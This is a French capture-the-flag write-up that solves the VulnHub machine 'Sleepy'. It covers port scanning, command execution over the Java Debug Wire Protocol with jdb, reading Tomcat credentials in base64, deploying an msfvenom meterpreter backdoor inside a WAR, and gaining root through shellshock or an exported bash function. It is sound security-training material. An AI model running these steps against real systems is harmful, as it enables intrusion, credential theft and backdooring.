# Solution du CTF /dev/random: Sleepy de VulnHub

Présentation
------------

[Sleepy](https://www.vulnhub.com/entry/devrandom-sleepy,123/) est un autre CTF créé par [Sagi](https://twitter.com/@s4gi_) et disponible sur *VulnHub*.  

Ses CTFs sont généralement d'intérêt alors pourquoi se priver ?  

Scanner n'est pas jouer
-----------------------

La machine est visiblement protégée derrière un firewall. Bien qu'elle réponde à un ping scan de *Nmap* lancé en root, le serveur ne répond pas à la commande ping. L'explication se situe dans la page de manuelle de *Nmap* qui indique qu'en root une requête ARP est aussi effectuée.  

Ensuite *Nmap* ne voit aucun port ouvert lors d'un scan SYN et affiche un message *Skipping host 192.168.1.50 due to host timeout*.  

Avec un scan plus bruyant (*sudo nmap -T5 -A -p- --open 192.168.1.50 -PN -sT -sC* ) on obtient ce que l'on voulait savoir :  

```plain
Nmap scan report for 192.168.1.50
Host is up (0.0013s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
9001/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 1.6 1.7.0_71
MAC Address: 08:00:27:79:0F:C3 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 1 hop
```

Le serveur FTP que Nmap considère comme un vsftpd permet la connexion en anonyme. Il ne contient qu'un seul fichier appartenant à un utilisateur avec l'UID 1002 :  

```plain
$ ftp anonymous@192.168.1.50
Connected to 192.168.1.50.                                                                                                                                                                    
220 ZzZZzZzz FTP                                                                                                                                                                              
331 Please specify the password.                                                                                                                                                              
Password:                                                                                                                                                                                     
230 Login successful.                                                                                                                                                                         
Remote system type is UNIX.                                                                                                                                                                   
Using binary mode to transfer files.                                                                                                                                                          
ftp> passive
Passive mode: off; fallback to active mode: off.                                                                                                                                              
ftp> ls                                                                                                                                                                                       
200 EPRT command successful. Consider using EPSV.                                                                                                                                             
150 Here comes the directory listing.                                                                                                                                                         
drwxrwxrwx    2 0        1002           23 Jun 19  2015 pub                                                                                                                                   
226 Directory send OK.                                                                                                                                                                        
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 1002     1002       120456 Jun 18  2015 sleepy.png
226 Directory send OK.
ftp> get sleepy.png
local: sleepy.png remote: sleepy.png
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for sleepy.png (120456 bytes).
100% |*************************************************************************************************************************************************************************************************|   117 KiB  459.50 MiB/s    00:00 ETA
226 Transfer complete.
120456 bytes received in 00:00 (351.30 MiB/s)
```

L'image récupérée est celle du nain Dormeur sur un fond blanc. Aucune métadonnée ni aucune chaîne de caractères intéressante n'est présente dans ce fichier...  

L'upload en tant qu'anonyme n'est pas possible, ce qui aurait pu nous arranger par la suite :(   

JServ ne suffit pas
-------------------

Je passerais rapidement sur les tentatives d'exploitation du port 8009 : ce port correspond à un protocole spécial Java sur lequel est généralement rattaché un *Tomcat* sur le port 8080.  

Ici point de port 8080 donc une méthode d'exploitation connue est de configurer soit même un Apache/Tomcat capable de dialoguer avec le port 8009 et d'utiliser le Tomcat comme relais pour les attaques.  

On trouve deux tutos [ici](https://diablohorn.com/2011/10/19/8009-the-forgotten-tomcat-port/) et [là](https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/).  

Il faut pour récupérer un shell utiliser le module *tomcat\_mgr\_deploy* de *Metasploit* ou uploader une archive *war* (par exemple générée via *msfvenom*) depuis l'interface du *Tomcat*.  

Cette interface requiert des identifiants valides. *Metasploit* peut les bruteforcer avec le module *tomcat\_mgr\_login* mais même avec la liste *rockyou* impossible de récupérer un account sur ce CTF.  

Le port qui m'aimait
--------------------

Le port 9001 correspond à un *Java Debug Wire Protocol*. En bref c'est un port qui permet le débogage distant de la JVM via le débogueur jdb (du paquet jdk qu'il faut donc avoir installé).  

Et qui dit débogueur dit possibilité de détourner le flot d'exécution d'un programme ou de faire exécuter ses propres instructions.  

Une recherche sur le sujet nous retourne [un premier document de *prdelka*](https://packetstormsecurity.com/files/122525/JDWP-Exploitation.html) qui nous laisse sur notre fin quand aux résultats obtenus :  

![JDB access on Sleepy CTF with basic command execution](https://raw.githubusercontent.com/devl00p/blog/master/images/sleepy/sleepy_jdb.png)

Certes on peut exécuter des commandes, mais ne pas être en mesure de récupérer l'output ce n'est pas terrible. Je pars alors à la recherche de *tips and tricks* concernant jdb et [je trouve une petite pépite](https://blog.silentsignal.eu/2014/02/09/jdb-tricks-hacking-java-debug-wire/) :)  

![JDB command execution with first line output](https://raw.githubusercontent.com/devl00p/blog/master/images/sleepy/sleepy.png)

Pas mal, ça nous permet de lancer une commande et de récupérer la première ligne de la sortie. Suffisant pour récupérer le nom d'utilisateur sous lequel on tourne via la commande suivante :  

```plain
print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("id").getInputStream())).readLine())
```

Avec un peu de jugeote on peu utiliser la commande base64 pour récupérer le contenu d'un fichier encodé en une seule ligne :  

```plain
base64 -w 0 /etc/tomcat/tomcat-users.xml
```

Le base64 obtenu et décodé permet d'obtenir les credentials du *Tomcat* : *sl33py* / *Gu3SSmYStR0NgPa$sw0rD!*.  

Avec des identifiants j'aurais pu enchaîner directement sur le Tomcat mis en place plus tôt mais je voulais profiter un peu plus de cet accès un peu particulier, voir si je pouvais m'offrir un accès sur le serveur malgré le firewall.  

Le serveur n'a pas de netcat, pas de wget, pas de tftp en revanche il y a curl et un python2...  

Un curl sortant ne donne rien même sur le port 80... Le trafic sortant est donc aussi filtré :(  

UDP peut-être ? J'ai écouté sur le port UDP 69 de ma machine et tenté une sortie avec cURL et son support de TFTP (*curl tftp://mon\_ip/nawak*)... mais toujours rien.  

IPv6 ? Récupérer l'output de *ip -6 addr* est compliqué à cause du fait qu'on ne puisse pas placer un pipe ou une redirection dans le jdb :(   

Heureusement si je lance un *ping6 -c 1 mon\_adresse\_ipv6* j'obtiens bien une ligne dans un *tshark* préalablement lancé (*sudo tshark -i any icmp6*) :   

```plain
30 51.222553564 2a01:dead:beef:cafe:babe:0ff:1ce:fc3 → 2a01:decaf:f00d:face:bad:a55:c0f3:f26c ICMPv6 120 Echo (ping) request id=0x074e, seq=1, hop limit=64
```

Je relance un scan Nmap en IPv6, pas de pépites mais au moins on a le serveur Tomcat sans relais :  

```plain
PORT     STATE SERVICE
8009/tcp open  ajp13
8080/tcp open  http-proxy
```

Bons baisers de Tomcat
----------------------

Les identifiants fonctionnent comme on pouvait s'y attendre, malheureusement... c'est le module MSF qui ne parvient pas à nous obtenir quelque chose... Même en testant différentes *targets* (Linux ou Java) et payloads :'(   

J'ai décidé de me remettre à une exploitation plus manuelle comme expliquée [sur ce blog](http://blog.opensecurityresearch.com/2012/09/manually-exploiting-tomcat-manager.html).  

Il s'agit d'utiliser l'un des shells du projet *Laudanum* :  

> Laudanum is a collection of injectable files, designed to be used in a pentest when SQL injection flaws are found and are in multiple languages for different environments.  
> 
> They provide functionality such as shell, DNS query, LDAP retrieval and others.

![Sleepy WAR JSP backdoor](https://raw.githubusercontent.com/devl00p/blog/master/images/sleepy/sleepy_war.png)

Ce shell est certes plus sexy à première vue... mais on s'aperçoit vite qu'il gère mal aussi les pipes et compagnie... Et il nous faut absolument pouvoir uploader une backdoor digne de ce nom.  

Pour cela on va réutiliser la fonctionnalité d'upload du Tomcat en intégrant une backdoor dans une archive war :  

```plain
msfvenom -p linux/x86/meterpreter/bind_ipv6_tcp LPORT=9999 -f elf > backdoor
```

Une fois le war déployé on retrouve la backdoor dans l'arborescence du Tomcat. Il ne reste plus qu'à l'exécuter via jdb si on veut un shell avec l'utilisateur *sleepy* :  

```plain
print new java.lang.Runtime().exec("/usr/share/tomcat/webapps/cmd/backdoor")
```

Permis de tuer
--------------

Une fois le *meterpreter* récupéré on fouille un peu :  

```plain
bash-4.2$ find / -perm -u+s 2> /dev/null
find / -perm -u+s 2> /dev/null
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/nightmare
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib64/dbus-1/dbus-daemon-launch-helper
bash-4.2$ ls -l /usr/bin/nightmare
ls -l /usr/bin/nightmare
-rwsr-s---. 1 root tomcat 8669 Jan 18  2015 /usr/bin/nightmare
```

On voit ici un programme baptisé *nightmare* qui ne semble pas commun (aucun retour après une recherche web), qui plus est le set-gid *tomcat* fait un peu tâche avec le nom du binaire...  

Manque de bol il n'est pas word-readable donc il faut récupérer le binaire en tant que *tomcat* (ou recopier le binaire et mettre les bonnes permissions dessus pour ensuite le récupérer en tant que *sleepy*).  

Haha quand je pense que je me suis démené pour avoir les droits de *sleepy* :'D :'( Uh mad bro ?  

Une fois le binaire (enfin) obtenu et après un strings rapide on peut le lancer avec *ltrace* :  

```plain
__libc_start_main([ "./nightmare" ] <unfinished ...>
memset(0x7fff4e6ecd30, '\0', 152)                                                                                                                  = 0x7fff4e6ecd30
sigaction(SIGINT, { 0x40081f, <>, 0, nil }, nil)                                                                                                   = 0
sigaction(SIGTERM, { 0x40081f, <>, 0, nil }, nil)                                                                                                  = 0
open("/dev/tty", 2, 00)                                                                                                                            = 3
system("/usr/bin/aafire"sh: /usr/bin/aafire: Aucun fichier ou dossier de ce type
 <no return ...>
--- SIGCHLD (Le processus fils a terminé) ---
<... system resumed> )                                                                                                                             = 32512
printf("[+] Again [y/n]? ")                                                                                                                        = 17

getchar(0x7fdc8cbb4011, 0x400a26, 0x7fdc8c992750, 17[+] Again [y/n]? n
)                                                                                              = 110
getchar(0, 0x7fdc8c992760, 110, 0x7fdc8c6d0270)                                                                                                    = 10
puts("Oops.. 'n' is broken"Oops.. 'n' is broken
)                                                                                                                       = 21

getchar(0x7fdc8cbb4011, 0x400a26, 0x7fdc8c992750, 17[+] Again [y/n]? ^C <no return ...>
--- SIGINT (Interrompre) ---
setresuid(0, 0, 0, 0x7fdc8c6d0270)                                                                                                                 = -1
setresgid(0, 0, 0, 0x7fdc8c6ae2e7)                                                                                                                 = -1
system("/usr/bin/sl -al"sh: /usr/bin/sl: Aucun fichier ou dossier de ce type
 <no return ...>
--- SIGCHLD (Le processus fils a terminé) ---
<... system resumed> )                                                                                                                             = 32512
exit(0 <no return ...>
+++ exited (status 0) +++
```

On peut voir que le programme lance [aafire](https://www.youtube.com/watch?v=IiVcaVUHIeg) puis rentre dans une boucle demandant si on souhaite relancer ou nom le programme.  

La réponse est obtenue par un getchar() donc pas de buffer overflow à première vue.  

La réponse 'n' pour sortir de là n'a aucun effet comme indiqué par un message d'erreur... Il faut donc faire un ctrl+C pour en sortir.  

Le binaire continue alors son exécution dans un handler mis en place pour attraper le signal correspondant (SIGINT). Ce handler fait un setreuid 0 avant de lancer la commande [sl](https://www.youtube.com/watch?v=jJBNBHQv_c0) (un programme amusant qui fait défiler une locomotive à l'écran).  

La boucle ne semble pas contenir de faille :  

![nightmare sleepy CTF main function](https://raw.githubusercontent.com/devl00p/blog/master/images/sleepy/nightmare_main.png)

Il en va de même pour les fonctions appelant les programmes externes (les paths sont absolus) :  

![nightmare sleepy CTF fire and train functions](https://raw.githubusercontent.com/devl00p/blog/master/images/sleepy/nightmare_fire_and_train.png)

J'ai cherché comment exploiter cette situation et après quelques recherches j'ai finalement testé shellshock :  

![Sleepy CTF nightmare shellshock exploitation](https://raw.githubusercontent.com/devl00p/blog/master/images/sleepy/sleepy_root_flag.png)

Il faut pouvoir faire un *kill -2* depuis un autre shell pour rentrer dans la section du code qui appelle */usr/bin/sl* (depuis le jsp c'est parfait).  

Alternative ending
------------------

J'ai vu après coup qu'il était possible de définir une fonction bash ayant comme nom le chemin complet de *sl* (puisque c'est celui lancé avec les bonnes permissions) [comme l'a fait *g0blin*](https://g0blin.co.uk/devrandom-sleepy-vulnhub-writeup/) et de l'exporter. De cette façon c'est la fonction bash qui est exécutée au lieu de la commande.  

Ce comportement est indiqué dans la page de manuel de bash :  

> **Path Search**  
> 
> When locating a command, the shell first looks to see if it has a shell function by that name.  
> 
> Then it looks for a builtin command by that name. If a builtin command is not found, one of two things happen:  
> 
> 1. Command names containing a slash are simply executed without performing any searches.
> 2. The shell searches each entry in PATH in turn for the command. The value of the PATH variable should be a series of entries separated by colons.  
> 
>  Each entry consists of a directory name. The current directory may be indicated implicitly by an empty directory name, or explicitly by a single period.
> 

Je ne regarderais plus jamais un appel à *system()* avec chemin absolu de la même façon :D  

Bon CTF en tout cas !  


*Published November 23 2017 at 18:20*